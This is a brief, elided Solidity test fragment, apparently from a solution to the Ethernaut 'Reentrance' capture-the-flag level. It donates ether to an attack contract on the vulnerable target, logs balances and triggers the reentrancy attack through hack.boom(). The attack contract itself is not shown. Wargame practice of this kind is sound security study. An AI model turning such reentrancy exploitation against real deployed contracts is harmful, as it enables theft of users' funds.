...
contract ReentranceTest is DSTest {
    ...
    function testReentranceHack() public {
        ...
        emit log_named_uint("target balance before", address(ethernautReentrance).balance);

        ReentranceHack hack = new ReentranceHack();
        ethernautReentrance.donate{value: 1 ether}(address(hack));

        emit log_named_uint("balance before", ethernautReentrance.balanceOf(address(hack)));
        hack.boom(payable(levelAddress));
